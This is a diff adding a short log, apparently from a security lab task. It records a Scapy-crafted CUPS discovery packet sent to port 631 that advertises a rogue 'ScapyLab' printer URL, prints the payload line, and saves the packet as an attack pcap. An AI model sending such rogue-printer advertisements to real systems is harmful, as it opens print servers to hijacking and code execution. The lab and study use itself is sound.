@@ -1,0 +1,4 @@
+2026-11-10 13:02:47,696 INFO Sending discovery packet to 127.0.0.1:631
+2026-11-10 13:02:47,696 INFO Advertised printer: http://172.19.0.2:8631/printers/ScapyLab
+2026-11-10 13:02:47,696 INFO Payload: 0 3 http://172.19.0.2:8631/printers/ScapyLab "Lab" "Scapy test printer"
+2026-11-10 13:02:47,696 INFO Saved packet to pcap_files/task2_attack_v3.pcap
